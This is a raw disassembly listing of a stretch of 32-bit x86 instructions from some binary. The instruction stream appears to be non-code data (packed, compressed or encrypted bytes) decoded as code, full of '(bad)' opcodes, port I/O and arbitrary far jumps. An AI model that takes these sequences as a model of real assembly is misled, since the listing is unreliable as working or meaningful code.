  415a8f:	adc    al,0xf0
  415a91:	or     DWORD PTR [edx+0x60],esp
  415a94:	mov    DWORD PTR [edx-0x3ee179eb],ebp
  415a9a:	sub    BYTE PTR [edx],ch
  415a9c:	jmp    0x2c8e:0x1b2547da
  415aa3:	jl     0x415a6b
  415aa5:	or     eax,0x86eaac8c
  415aaa:	loop   0x415ab7
  415aac:	inc    ebp
  415aad:	loope  0x415ac7
  415aaf:	sbb    eax,0xa0a1d00
  415ab4:	imul   ebp,edx,0xffffffb0
  415ab7:	dec    ebp
  415ab8:	add    al,ch
  415aba:	jmp    0xcde2:0x73ea3aa5
  415ac1:	sub    dh,bl
  415ac3:	push   esp
  415ac4:	mov    ebx,DWORD PTR [edx-0x1e]
  415ac7:	adc    BYTE PTR [ebp-0x7a],ah
  415aca:	ret    0xa86c
  415acd:	out    dx,al
  415ace:	out    0x28,al
  415ad0:	add    BYTE PTR [edx-0x7e],ch
  415ad3:	movlps xmm3,QWORD PTR [ebx]
  415ad6:	jp     0x415af9
  415ad8:	loop   0x415a78
  415ada:	mov    esp,0x50d0c72
  415adf:	fwait
  415ae0:	ins    BYTE PTR es:[edi],dx
  415ae1:	xor    al,0x65
  415ae3:	xchg   esi,eax
  415ae4:	push   esp
  415ae5:	push   esi
  415ae6:	in     al,dx
  415ae7:	clc    
  415ae8:	mov    esp,0xd0db3680
  415aed:	push   0xffffff88
  415aef:	push   ss
  415af0:	sbb    al,0x1e
  415af2:	push   edx
  415af3:	es add al,0x44
  415af6:	fwait
  415af7:	sub    bh,BYTE PTR [esi]
  415af9:	sub    al,0xc2
  415afb:	and    al,0xa0
  415afd:	in     al,dx
  415afe:	retf   0xdcdf
  415b01:	adc    al,0x56
  415b03:	sbb    al,0x4b
  415b05:	shr    BYTE PTR [ecx],cl
  415b07:	call   0x286e4974
  415b0c:	push   0xc4f96a17
  415b11:	nop
  415b12:	test   al,0xe7
  415b14:	xchg   edx,eax
  415b15:	(bad)  
  415b16:	and    ah,BYTE PTR [ecx+0x3a478a86]
  415b1c:	sbb    BYTE PTR [edx],bh
  415b1e:	dec    esi
  415b1f:	sbb    bh,BYTE PTR [ebp+0x1]
  415b22:	add    DWORD PTR [esi],edx
  415b24:	mov    BYTE PTR [esi+eiz*2-0x5e],bh
  415b28:	out    0x58,al
  415b2a:	js     0x415adc
  415b2c:	ror    BYTE PTR [edx+0x3b70343e],1
  415b32:	sar    BYTE PTR [ebx+ebp*1],1
  415b35:	call   0xc88383e4
  415b3a:	inc    eax
  415b3b:	jmp    0xdcefecc0
  415b40:	and    BYTE PTR [ecx+0x47],0x53
  415b44:	inc    ebp
  415b45:	bound  edx,QWORD PTR [ecx+edx*8+0x467e7e88]
  415b4c:	call   0x287a:0x85436b7d
  415b53:	mov    cl,0x26
  415b55:	lods   eax,DWORD PTR ds:[esi]
  415b56:	adc    eax,0xa0b6fe18
  415b5b:	ret    0x7a69
  415b5e:	sbb    al,0x26
  415b60:	dec    esi
  415b61:	mov    ebp,0xad839afe
  415b66:	push   eax
  415b67:	inc    edx
  415b68:	adc    bl,BYTE PTR [edx-0x2b3b02b9]
  415b6e:	mov    ch,0x60
  415b70:	int    0x44
  415b72:	lea    ecx,[eax]
  415b74:	jns    0x415b98
  415b76:	ret    0xb0eb
  415b79:	into   
  415b7a:	push   esp
  415b7b:	retf   0x7cca
  415b7e:	xchg   ecx,eax
  415b7f:	inc    esi
  415b80:	cli    
  415b81:	sub    eax,0xe51763a2
  415b86:	fidivr WORD PTR [esi+0xfe8f472]
  415b8c:	dec    ebp
  415b8d:	test   BYTE PTR [edx],0xa0
  415b90:	xor    dh,BYTE PTR [ebx+0x40]
  415b93:	mov    al,ds:0x222f2ce6
  415b98:	add    DWORD PTR ds:[eax-0x42],ebp
  415b9c:	sahf   
  415b9d:	mov    al,ds:0x7461e227
  415ba2:	mov    ah,0x4f
  415ba4:	mov    dl,0xbb
  415ba6:	inc    edx
  415ba7:	jbe    0x415bc3
  415ba9:	ins    BYTE PTR es:[edi],dx
  415baa:	mov    esp,0x3f02078e
  415baf:	loop   0x415bd4
  415bb1:	and    DWORD PTR [esi+0x1d1d88c],edx
  415bb7:	lds    ecx,FWORD PTR [edx+0x55c476a0]
  415bbd:	(bad)  
  415bbe:	cs push ebp
  415bc0:	(bad)  
  415bc2:	in     eax,dx
  415bc3:	and    DWORD PTR [eax-0x67],esi
  415bc6:	shr    al,1
  415bc8:	jbe    0x415b84
  415bca:	ror    BYTE PTR [edx-0x47b349e0],0xbc
  415bd1:	xchg   ebp,eax
  415bd2:	lods   al,BYTE PTR ds:[esi]
  415bd3:	sub    al,0x68
  415bd5:	add    eax,0xc607825d
  415bda:	dec    eax
  415bdb:	xor    al,0x53
  415bdd:	push   es
  415bde:	je     0x415c48
  415be0:	cmp    al,BYTE PTR [esp+ebx*4]
  415be3:	add    eax,0xd061bc1c
  415be8:	popa   
  415be9:	push   0x8684ee2b
  415bee:	inc    eax
  415bef:	test   al,0xda
  415bf1:	dec    eax
  415bf2:	cmp    eax,DWORD PTR [edi+0x6e9baed4]
  415bf8:	cmp    al,BYTE PTR [eax]
  415bfa:	adc    edi,eax
  415bfc:	cmp    eax,0x65be305d
  415c01:	pop    edi
  415c02:	jo     0x415b89
  415c04:	mov    dh,0xca
  415c06:	addr16 in al,0xd9
  415c09:	test   eax,0x1c6ea400
  415c0e:	cmp    DWORD PTR [ecx+0x45],0x27
  415c12:	cmp    al,0xa0
  415c14:	inc    esi
  415c15:	mov    BYTE PTR [eax],0xe8
  415c18:	inc    eax
  415c19:	xchg   BYTE PTR [esi+0x1b],dh
  415c1c:	inc    edi
  415c1d:	imul   edi,ebp,0x802042fe
  415c23:	mov    edx,0x2802aed5
  415c28:	sub    BYTE PTR [esi-0x38d2e5fd],ah
  415c2e:	inc    edx
  415c2f:	mov    bl,0xd0
  415c31:	mov    WORD PTR [edx],fs
  415c33:	repnz (bad) 
  415c35:	sbb    al,bl
  415c37:	(bad)  
  415c38:	xchg   esi,eax
  415c39:	push   edx
  415c3a:	mov    edx,0x923021e8
  415c3f:	inc    ebp
  415c40:	add    BYTE PTR [ecx],dh
  415c42:	mov    esp,0x4d0d6055
  415c47:	aam    0x5b
  415c49:	in     al,dx
  415c4a:	data16 sub BYTE PTR [eax-0x14],cl
  415c4e:	dec    edx
  415c4f:	shl    BYTE PTR [esi+0x1c4a38d6],0xc
  415c56:	jo     0x415c9e
  415c58:	jae    0x415c1a
  415c5a:	add    DWORD PTR [ecx+0x7c6202e9],esi
  415c60:	leave  
  415c61:	in     al,0xa2
  415c63:	push   edi
  415c64:	lea    esp,[esi]
  415c66:	and    al,0x54
  415c68:	cwde   
  415c69:	dec    esp
  415c6a:	jbe    0x415c86
  415c6c:	sbb    eax,0x54a9a2ad
  415c71:	sbb    al,0xb3
  415c73:	retf   0x40f7
  415c76:	ss xor al,ah
  415c79:	push   eax
  415c7a:	xchg   ebx,eax
  415c7b:	test   al,0xb2
  415c7d:	mov    ebp,0x42f89c1c
  415c82:	dec    ebp
  415c83:	inc    edi
  415c84:	sub    DWORD PTR ds:0xbe686f54,0x7730e318
  415c8e:	lock arpl bp,ax
  415c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c92:	test   DWORD PTR [esi+eiz*4],ecx
  415c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c96:	mov    BYTE PTR [ecx+0x71588885],dl
  415c9c:	and    BYTE PTR [edx],bl
  415c9e:	fldenv [ecx+edx*2-0x11]
  415ca2:	mov    eax,ds:0xa65c15a2
  415ca7:	outs   dx,DWORD PTR ds:[esi]
  415ca8:	fidivr WORD PTR [edi]
  415caa:	or     al,BYTE PTR [edx-0x18]
  415cad:	push   esi
  415cae:	loopne 0x415cbd
  415cb0:	ins    BYTE PTR es:[edi],dx
  415cb1:	and    dh,BYTE PTR [eax]
  415cb3:	xor    al,0x5e
  415cb5:	mov    cl,0x2c
  415cb7:	inc    eax
  415cb8:	fist   DWORD PTR [eax+0x40]
  415cbb:	pop    esi
  415cbc:	inc    ebp
  415cbd:	aam    0x9c
  415cbf:	dec    esi
  415cc0:	cli    
  415cc1:	jo     0x415d35
  415cc3:	mov    ah,0xf6
  415cc5:	enter  0xb644,0xee
  415cc9:	jo     0x415c9c
  415ccb:	mov    cl,ah
  415ccd:	pushf  
  415cce:	call   0x204d:0x92eaac5a
  415cd5:	push   es
  415cd6:	daa    
  415cd7:	jno    0x415c63
  415cd9:	push   ss
  415cda:	jb     0x415cee
  415cdc:	push   eax
  415cdd:	loopne 0x415c71
  415cdf:	xor    dh,dh
  415ce1:	shl    BYTE PTR [esi],1
  415ce3:	push   0xffffff80
  415ce5:	loopne 0x415cab
  415ce7:	push   0xffffffc9
  415ce9:	je     0x415cc7
  415ceb:	arpl   bx,si
  415ced:	push   es
  415cee:	ret    
  415cef:	ja     0x415d49
  415cf1:	out    0xbc,al
  415cf3:	sbb    al,0x63
  415cf5:	add    BYTE PTR [ecx-0x25200a37],dh
  415cfb:	sbb    ch,BYTE PTR [edx+edx*8-0x766d4d70]
  415d02:	call   0xb1e0:0x30a8e5c1
  415d09:	or     BYTE PTR [ebp-0x3c],0x4a
  415d0d:	ret    
  415d0e:	dec    BYTE PTR [edi+0x5b]
  415d11:	in     eax,dx
  415d12:	add    edx,eax
  415d14:	dec    edi
  415d15:	or     al,0x29
  415d17:	push   ecx
  415d18:	xor    al,0x45
  415d1a:	call   0x15cf5567
  415d1f:	pop    ebp
  415d20:	outs   dx,BYTE PTR ds:[esi]
  415d21:	xor    DWORD PTR [esi+ebx*8+0x757216ec],ebp
  415d28:	iret   
  415d29:	and    BYTE PTR [edx],bh
  415d2b:	and    BYTE PTR [edx+eiz*1],ah
  415d2e:	sahf   
  415d2f:	jb     0x415d6c
  415d31:	rcr    ah,1
  415d33:	push   esp
  415d34:	mov    edx,DWORD PTR [ebp+0x23]
  415d37:	pusha  
  415d38:	push   cs
  415d39:	retf   0x97ee
  415d3c:	fcomp  DWORD PTR [edx+0x50]
  415d3f:	mov    ds:0x9fbed857,al
  415d44:	xor    al,0x14
  415d46:	ins    DWORD PTR es:[edi],dx
  415d47:	xchg   DWORD PTR [ecx+0x73],ebp
  415d4a:	sub    al,BYTE PTR [eax]
  415d4c:	pop    edi
  415d4d:	mov    ebx,0x59842e12
  415d52:	retf   
  415d53:	inc    esi
  415d54:	xor    BYTE PTR [esi-0x3b94db56],al
  415d5a:	pop    ecx
  415d5b:	adc    BYTE PTR [eax],bl
  415d5d:	dec    edi
  415d5e:	loope  0x415d7b
  415d60:	pop    ebp
  415d61:	cli    
  415d62:	retf   0xf83d
  415d65:	ins    DWORD PTR es:[edi],dx
  415d66:	mov    esi,0x919a04a3
  415d6b:	adc    al,BYTE PTR [esi]
  415d6d:	xchg   BYTE PTR [eax],ch
  415d6f:	mov    cl,0x28
  415d71:	inc    eax
  415d72:	mov    eax,ds:0xc0941cdc
  415d77:	out    dx,al
  415d78:	cwde   
  415d79:	inc    ecx
  415d7a:	push   0xacf6200b
  415d7f:	inc    ecx
  415d80:	fimul  WORD PTR [esi-0x5b5e56e8]
  415d86:	cmp    dh,bl
  415d88:	bound  ebp,QWORD PTR [edx+0x58]
  415d8b:	loopne 0x415d9d
  415d8d:	mov    edx,0x420aebaa
  415d92:	repnz sub esp,DWORD PTR [ebx-0x9d7a6e3]
  415d99:	push   es
  415d9a:	mov    ch,ch
  415d9c:	sbb    bh,0x7b
  415d9f:	mov    ch,0xd
  415da1:	and    bh,BYTE PTR [eax+0x4b2f026]
  415da7:	mov    eax,0x1cc42d99
  415dac:	add    al,0x4
  415dae:	pop    ebp
  415daf:	fcmovb st,st(1)
  415db1:	js     0x415e0b
  415db3:	push   ss
  415db4:	cmp    eax,0x2410d812
  415db9:	xor    al,0x16
  415dbb:	mov    cl,al
  415dbd:	bound  esp,QWORD PTR [esi]
  415dbf:	loope  0x415d47
  415dc1:	xchg   edi,eax
  415dc2:	add    al,0xfc
  415dc4:	mov    ah,0x92
  415dc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dc7:	push   0x0
  415dc9:	lahf   
  415dca:	test   DWORD PTR [edx+0x3126b6b2],edx
  415dd0:	leave  
  415dd1:	inc    eax
  415dd2:	push   eax
  415dd3:	(bad)  
  415dd4:	hlt    
  415dd5:	mov    eax,0x68585356
  415dda:	into   
  415ddb:	jmp    0xa106:0xf3283a64
  415de2:	mov    ds:0x595e3039,eax
  415de7:	push   ds
  415de8:	fs xchg esi,eax
  415dea:	shl    DWORD PTR [ebx+0x65260d88],0x32
  415df1:	push   cs
  415df2:	push   0xffffffe4
  415df4:	or     bl,BYTE PTR [edx+0x3ca64163]
  415dfa:	in     eax,0x11
  415dfc:	lock xor al,0x6d
  415dff:	test   cl,al
  415e01:	aam    0x5e
  415e03:	cwde   
  415e04:	fdiv   DWORD PTR [eax-0x64]
  415e07:	sbb    al,0xfe
  415e09:	push   edx
  415e0a:	push   ds
  415e0b:	lods   al,BYTE PTR ds:[esi]
  415e0c:	outs   dx,BYTE PTR ds:[esi]
  415e0d:	pop    eax
  415e0e:	aad    0xa0
  415e10:	mov    eax,ds:0xf027d428
  415e15:	inc    edx
  415e16:	cmp    BYTE PTR [ebp+0x899e1a2],bh
  415e1c:	(bad)  
  415e1d:	aam    0xcc
  415e1f:	pop    esi
  415e20:	scas   eax,DWORD PTR es:[edi]
  415e21:	push   edi
  415e22:	add    BYTE PTR [edi],dh
  415e24:	sub    edi,DWORD PTR [edx-0x5a]
  415e27:	ss sub bl,ch
  415e2a:	shr    DWORD PTR [ebp+ebp*8+0x5a10bdd4],0x93
  415e32:	adc    DWORD PTR [esi+0x79],eax
  415e35:	js     0x415dd1
  415e37:	xlat   BYTE PTR ds:[ebx]
  415e38:	push   ss
  415e39:	pop    es
  415e3a:	loopne 0x415e14
  415e3c:	stos   BYTE PTR es:[edi],al
  415e3d:	fsubr  st,st(0)
  415e3f:	into   
  415e40:	cld    
  415e41:	mov    eax,0x45bce87c
  415e46:	add    DWORD PTR [ebx+0x4e],0x1036fcc0
  415e4d:	fsub   QWORD PTR [eax-0x6bade220]
  415e53:	xor    al,ah
  415e55:	add    BYTE PTR [ebp-0x52cecf51],dl
  415e5b:	stos   BYTE PTR es:[edi],al
  415e5c:	mov    eax,ds:0xc31eb9
  415e61:	push   cs
  415e62:	or     DWORD PTR [eax-0x23eacf9b],eax
  415e68:	mov    ecx,0x1d50a80f
  415e6d:	test   BYTE PTR [edi-0x547df09c],ah
  415e73:	jb     0x415e1d
  415e75:	or     DWORD PTR [esi+0xe],ebp
  415e78:	jmp    0x6040:0x7594f5d8
  415e7f:	inc    edi
  415e80:	cmp    al,BYTE PTR [esp+edi*1-0x34430bde]
  415e87:	or     al,BYTE PTR [esi-0x79]
  415e8a:	cli    
  415e8b:	shl    DWORD PTR [ecx],cl
  415e8d:	dec    ebx
  415e8e:	dec    ebp
  415e8f:	dec    ebp
  415e90:	lods   eax,DWORD PTR ds:[esi]
  415e91:	xchg   BYTE PTR [edx+edi*8+0x1ca5b236],ch
  415e98:	fild   WORD PTR [ebx-0x61caaf30]
  415e9e:	adc    al,0xa8
  415ea0:	test   al,0xda
  415ea2:	mov    eax,ds:0xe76c2604
  415ea7:	mov    al,0x16
  415ea9:	mov    dl,0xa6
  415eab:	xchg   esi,eax
  415eac:	(bad)  
  415ead:	mov    ebx,0x33bc29
  415eb2:	dec    ebx
  415eb3:	leave  
  415eb4:	call   0xc11c:0x2ed8354d
  415ebb:	sbb    al,0x31
  415ebd:	pop    ss
  415ebe:	jae    0x415e98
  415ec0:	jmp    0x415eba
  415ec2:	push   es
  415ec3:	push   ecx
  415ec4:	lock xchg DWORD PTR [eax],ebp
  415ec7:	push   DWORD PTR [edx-0xd]
  415eca:	sbb    BYTE PTR [edx+ecx*1+0x5b],0x53
  415ecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ed0:	cs shl edx,cl
  415ed3:	push   ds
  415ed4:	stos   DWORD PTR es:[edi],eax
  415ed5:	cmp    al,0x82
  415ed7:	push   esi
  415ed8:	or     DWORD PTR [ebp+0x75],esi
  415edb:	ins    BYTE PTR es:[edi],dx
  415edc:	cmp    esp,DWORD PTR [eax]
  415ede:	in     eax,dx
  415edf:	data16 stc 
  415ee1:	fs mov al,0x8a
  415ee4:	or     bh,BYTE PTR es:[eax-0x5f2bddb3]
  415eeb:	add    DWORD PTR [ebp+0xd],esi
  415eee:	sub    al,0x54
  415ef0:	jbe    0x415f27
  415ef2:	pusha  
  415ef3:	dec    eax
  415ef4:	adc    al,0xb2
  415ef6:	mov    dh,0x8e
  415ef8:	add    al,BYTE PTR [esi+edi*1-0x3ecb2f58]
  415eff:	lods   al,BYTE PTR ds:[esi]
  415f00:	push   esi
  415f01:	je     0x415f4f
  415f03:	cmp    al,0x12
  415f05:	bound  edi,QWORD PTR [ecx+0x1e]
  415f08:	inc    edx
  415f09:	enter  0x1cb4,0xa1
  415f0d:	mov    ds:0xe2cd8089,eax
  415f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f14:	mov    BYTE PTR [edi],0x30
  415f17:	xchg   ecx,eax
  415f18:	push   0x14c4e86e
  415f1d:	nop
  415f1e:	xor    eax,0x58a82889
  415f23:	dec    ecx
  415f24:	dec    eax
  415f25:	inc    esi
  415f26:	sub    BYTE PTR [ecx+0x4f587616],bl
  415f2c:	loop   0x415ee6
  415f2e:	dec    edx
  415f2f:	xor    ebp,DWORD PTR [edx+0x16fd9a90]
  415f35:	ret    
  415f36:	adc    ebx,DWORD PTR [eax+0x4]
  415f39:	xor    ah,al
  415f3b:	lods   al,BYTE PTR ds:[esi]
  415f3d:	lods   eax,DWORD PTR ds:[esi]
  415f3e:	jmp    0x2ef473d4
  415f43:	pop    ebx
  415f44:	mov    esi,0x80b113d4
  415f49:	inc    esi
  415f4a:	mov    cr5,eax
  415f4d:	jnp    0x415ed6
  415f4f:	pop    ebx
  415f50:	ficom  DWORD PTR [edi-0x2d]
  415f53:	fwait
  415f54:	pop    ebx
  415f55:	test   BYTE PTR [eax-0x15d8ff84],0xb7
  415f5c:	add    BYTE PTR [edi],ch
  415f5e:	jbe    0x415f0c
  415f60:	mov    WORD PTR [ebx-0x7a],cs
  415f63:	imul   eax,DWORD PTR [edi-0x27],0x10d93cb4
  415f6a:	cmp    ch,BYTE PTR [ebx+ebp*2+0x66721087]
  415f71:	mov    ah,0xe6
  415f73:	jne    0x415fcd
  415f75:	dec    esi
  415f76:	fist   DWORD PTR [eax]
  415f78:	adc    al,0x4
  415f7a:	call   0xa268:0x581a9b6a
  415f81:	inc    esp
  415f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f83:	pop    edx
  415f84:	mov    esp,0x7c1555b1
  415f89:	and    BYTE PTR [ecx+0x4d24b92a],ch
  415f8f:	push   edx
  415f90:	(bad)  
  415f92:	adc    al,0x12
  415f94:	push   cs
  415f95:	dec    ebx
  415f96:	adc    BYTE PTR [eax-0x27a93606],cl
  415f9c:	test   BYTE PTR [ecx],0xfc
  415f9f:	ret    0x430a
  415fa2:	pop    esi
  415fa3:	call   0x4788:0x15398552
  415faa:	push   ss
  415fab:	mov    esi,0x9ae2fafe
  415fb0:	mov    edi,0x71f6ede8
  415fb5:	push   edx
  415fb6:	sub    eax,0x981cfa00
  415fbb:	pop    eax
  415fbc:	add    BYTE PTR ds:0x2433009b,al
  415fc2:	mov    ds:0x1848a960,eax
  415fc7:	sahf   
  415fc8:	clc    
  415fc9:	lods   eax,DWORD PTR ds:[esi]
  415fca:	mov    ds:0x1b2e50c2,eax
  415fcf:	out    0x28,al
  415fd1:	inc    ecx
  415fd2:	in     al,0x46
  415fd4:	push   0x70
  415fd6:	stos   BYTE PTR es:[edi],al
  415fd7:	add    BYTE PTR [ebx-0x4d],bl
  415fda:	xor    BYTE PTR [eax+0x5e],dh
  415fdd:	mov    ecx,0x46bf3540
  415fe2:	mov    DWORD PTR [ebx+0x68],ebp
  415fe5:	inc    ecx
  415fe6:	xchg   ebp,eax
  415fe7:	nop
  415fe8:	jb     0x415ffa
  415fea:	js     0x415f94
  415fec:	pusha  
  415fed:	clc    
  415fee:	or     BYTE PTR [esi-0x490d5d76],0xf
  415ff5:	inc    eax
  415ff6:	xor    dh,BYTE PTR [eax+eiz*4-0x20aaaa0a]
  415ffd:	ror    BYTE PTR [edx],0x4b
  416000:	push   esi
  416001:	jae    0x41607b
  416003:	xlat   BYTE PTR ds:[ebx]
  416004:	int3   
  416005:	jne    0x41603b
  416007:	push   eax
  416008:	scas   al,BYTE PTR es:[edi]
  416009:	sbb    eax,0x6e071a06
  41600e:	lods   al,BYTE PTR ds:[esi]
  41600f:	js     0x416037
  416011:	fsubr  QWORD PTR [edx+0x12]
  416014:	jb     0x416056
  416016:	dec    esp
  416017:	imul   BYTE PTR [ebx+0x58]
  41601a:	fs aad 0x4a
  41601d:	sbb    DWORD PTR [edx+ebx*8+0x25],ecx
  416021:	popf   
  416022:	xor    cl,0xa6
  416025:	rcl    BYTE PTR [esi+0x19],1
  416028:	ss loop 0x4160a4
  41602b:	mov    dh,0xa4
  41602d:	jle    0x415fce
  41602f:	dec    edi
  416030:	xchg   esp,eax
  416031:	int    0x14
  416033:	pop    edx
  416034:	mov    eax,0x6cf1da96
  416039:	popf   
  41603a:	cmp    ch,BYTE PTR [edx+0xd722d3e]
  416040:	pushf  
  416041:	aad    0x72
  416043:	push   ds
  416044:	ss cmp al,0x52
  416047:	mov    ebp,DWORD PTR [eax+ebx*1]
  41604a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41604b:	outs   dx,BYTE PTR ds:[esi]
  41604c:	call   0x86aa2137
  416051:	dec    ecx
  416052:	call   0x81df6b2c
  416057:	lods   eax,DWORD PTR ds:[esi]
  416058:	inc    esp
  416059:	sub    ebx,DWORD PTR [edx]
  41605b:	or     dl,ah
  41605d:	dec    esi
  41605e:	fidiv  WORD PTR [ecx+0xe]
  416061:	adc    esp,DWORD PTR [ebx+ecx*1+0x34]
  416065:	adc    DWORD PTR ds:0xe500e61d,eax
  41606b:	stc    
  41606c:	mov    BYTE PTR ss:[edi+esi*1+0x6c],dl
  416071:	adc    BYTE PTR [ecx+0x2a],cl
  416074:	scas   al,BYTE PTR es:[edi]
  416075:	adc    al,0x80
  416077:	test   eax,0x694d84b5
  41607c:	rcr    BYTE PTR [esi-0x4f09f7f6],0xd6
  416083:	bound  ebp,QWORD PTR [eax-0x34]
  416086:	or     dh,dl
  416088:	jl     0x4160d6
  41608a:	cmp    eax,0x4a075b42
  41608f:	ss cli 
  416091:	les    eax,FWORD PTR [ebp-0x18]
  416094:	aam    0x4a
  416096:	adc    ebp,DWORD PTR [ebp+0x727722a3]
  41609c:	retf   0xd8ac
  41609f:	scas   al,BYTE PTR es:[edi]
  4160a0:	adc    BYTE PTR [edx+0x26],0x0
  4160a4:	out    dx,al
  4160a5:	xchg   edx,eax
  4160a6:	add    al,0x9b
  4160a8:	mov    al,ds:0x90777a18
  4160ad:	call   0x2eae:0xb4ccd5eb
  4160b4:	and    eax,0xe010f8ea
  4160b9:	call   0x16c0:0x694d795e
  4160c0:	jb     0x4160f2
  4160c2:	sar    edx,cl
  4160c4:	repnz xchg esp,eax
  4160c6:	sub    al,0x61
  4160c8:	aam    0x33
  4160ca:	mov    BYTE PTR [edx],bh
  4160cc:	sub    bl,BYTE PTR [eax]
  4160ce:	ins    BYTE PTR es:[edi],dx
  4160cf:	imul   esp,ecx,0xae9a5818
  4160d5:	push   0x74
  4160d7:	imul   BYTE PTR [esp+edi*4]
  4160da:	mov    ds:0xa0d6dc49,eax
  4160df:	test   al,0xfd
  4160e1:	add    BYTE PTR [bp+di-0x13d7],cl
  4160e6:	mov    dl,0x56
  4160e8:	sub    DWORD PTR cs:[edx-0x47],0x40
  4160ed:	mov    esp,0x306892e1
  4160f2:	dec    ebp
  4160f3:	movups xmm4,XMMWORD PTR [edi]
  4160f6:	shr    esi,cl
  4160f8:	xor    eax,0xe2a622c
  4160fd:	inc    ebp
  4160fe:	lods   al,BYTE PTR ds:[esi]
  4160ff:	xor    al,0xa5
  416101:	fst    DWORD PTR [eax]
  416103:	and    BYTE PTR [edx],cl
  416105:	push   esp
  416106:	cwde   
  416107:	loopne 0x416113
  416109:	sub    ebp,DWORD PTR [esi]
  41610b:	inc    eax
  41610c:	push   esp
  41610d:	fs jo  0x4160c4
  416110:	xor    BYTE PTR [esp+esi*4],dl
  416113:	inc    ebx
  416114:	jae    0x41612e
  416116:	loop   0x416190
  416118:	sub    BYTE PTR [eax],0xb2
  41611b:	sub    bh,BYTE PTR [edx+0x22]
  41611e:	test   al,0x35
  416120:	push   esp
  416121:	out    dx,al
  416122:	adc    eax,0xf8ee9e92
  416127:	shl    dl,0xdb
  41612a:	cli    
  41612b:	mov    al,ds:0xb0800e39
  416130:	inc    eax
  416131:	pusha  
  416132:	ss mov bl,0x0
  416135:	or     bl,BYTE PTR [edx+eiz*1]
  416138:	arpl   WORD PTR [ecx+0x158cc9e8],si
  41613e:	push   ebp
  41613f:	pop    ss
  416140:	add    BYTE PTR [edx+0x6c],ch
  416143:	sbb    BYTE PTR [ecx],al
  416145:	jl     0x41619e
  416147:	sti    
  416148:	ins    BYTE PTR es:[edi],dx
  416149:	xor    al,0x13
  41614b:	push   esi
  41614c:	retf   0x2efa
  41614f:	retf   
  416150:	or     ah,BYTE PTR [eax-0x60]
  416153:	mov    ecx,0x2404d408
  416158:	lods   eax,DWORD PTR ds:[esi]
  416159:	retf   0xc00c
  41615c:	ret    0x1298
  41615f:	or     eax,0xd058ec94
  416164:	push   eax
  416165:	push   0x40
  416167:	jecxz  0x4160ec
  416169:	add    eax,0x26a71360
  41616e:	mov    al,ds:0xea2080
  416173:	stos   BYTE PTR es:[edi],al
  416174:	xor    bl,BYTE PTR [edi-0x1f]
  416177:	add    al,0x7c
  416179:	shl    BYTE PTR [esi],cl
  41617b:	add    BYTE PTR [ebx+0x4c3e8aac],ch
  416181:	push   esp
  416182:	lods   eax,DWORD PTR ds:[esi]
  416183:	sub    BYTE PTR [edx-0x5c],ah
  416186:	hlt    
  416187:	or     al,dl
  416189:	jb     0x4161c5
  41618b:	shl    DWORD PTR [edi],0x9
  41618e:	(bad)  
  41618f:	cmp    al,0x80
  416191:	(bad)  
  416192:	fiadd  DWORD PTR [edx+edi*4+0x59e0b51e]
  416199:	inc    esp
  41619a:	sub    DWORD PTR [esi+0x15ef967e],esi
  4161a0:	dec    edx
  4161a1:	(bad)  
  4161a3:	mov    cl,0x1c
  4161a5:	loope  0x416202
  4161a7:	mov    bh,0xf0
  4161a9:	iret   
  4161aa:	outs   dx,DWORD PTR ds:[esi]
  4161ab:	push   0x4d
  4161ad:	cmc    
  4161ae:	jb     0x4161cf
  4161b0:	xchg   BYTE PTR [esi-0x78],cl
  4161b3:	add    al,0xac
  4161b5:	cmp    edi,DWORD PTR [esi+0x7a0034db]
  4161bb:	sbb    eax,0x8135a906
  4161c0:	sub    bh,ch
  4161c2:	aam    0x24
  4161c4:	mov    ecx,fs
  4161c6:	xor    eax,0xb3240585
  4161cb:	clc    
  4161cc:	and    dh,BYTE PTR [ecx+eiz*2+0xfa2c003]
  4161d3:	lods   al,BYTE PTR ds:[esi]
  4161d4:	xchg   ebp,eax
  4161d5:	and    BYTE PTR [esi+0x4e],cl
  4161d8:	add    DWORD PTR [edx+0x8],eax
  4161db:	loop   0x4161bb
  4161dd:	ss mov al,0x85
  4161e0:	ror    BYTE PTR [ecx-0x40],1
  4161e3:	mov    al,ds:0x141af5da
  4161e8:	sbb    BYTE PTR [ecx],0xc0
  4161eb:	test   BYTE PTR [esi+0xc],dl
  4161ee:	inc    edx
  4161ef:	or     ecx,DWORD PTR [edx+0x560c5c1a]
  4161f5:	sub    al,0x9c
  4161f7:	iret   
  4161f8:	inc    ebp
  4161f9:	ss xor al,0x54
  4161fc:	jl     0x41621e
  4161fe:	mov    ch,0x9a
  416200:	mov    ebx,0xf2feb86e
  416205:	inc    esp
  416206:	dec    DWORD PTR [edx-0x167bed31]
  41620c:	sub    eax,0xa1009cac
  416211:	pop    esi
  416212:	add    bl,al
  416214:	rol    BYTE PTR [eax],1
  416216:	rcr    DWORD PTR [esi],0x52
  416219:	fwait
  41621a:	(bad)  
  41621b:	ja     0x4161a0
  41621d:	rcr    BYTE PTR [esi+0x254beec],cl
  416223:	push   esi
  416224:	inc    ecx
  416225:	push   ss
  416226:	mov    dl,0x6a
  416228:	sbb    al,0xf1
  41622a:	ins    DWORD PTR es:[edi],dx
  41622b:	jae    0x416228
  41622d:	add    DWORD PTR [ecx+edx*1],edx
  416230:	jle    0x4161de
  416232:	aas    
  416233:	add    BYTE PTR [eax-0x655f11f3],ch
  416239:	fwait
  41623a:	mov    cl,BYTE PTR [eax*1+0x5ce680c0]
  416241:	sbb    dl,bh
  416243:	jnp    0x4161f2
  416245:	mov    ds:0xe261110e,al
  41624a:	xchg   edx,eax
  41624b:	scas   al,BYTE PTR es:[edi]
  41624c:	or     dl,bl
  41624e:	mov    bh,0xb5
  416250:	test   eax,0xb8a43280
  416255:	xor    BYTE PTR [edx-0x2e7fe47e],bl
  41625b:	cli    
  41625c:	cdq    
  41625d:	add    al,0x0
  41625f:	push   ecx
  416260:	hlt    
  416261:	shl    ebp,1
  416263:	and    al,0xa0
  416265:	sub    bh,dh
  416267:	cld    
  416268:	outs   dx,BYTE PTR ds:[esi]
  416269:	es scas al,BYTE PTR es:[edi]
  41626b:	lds    esi,FWORD PTR [ecx]
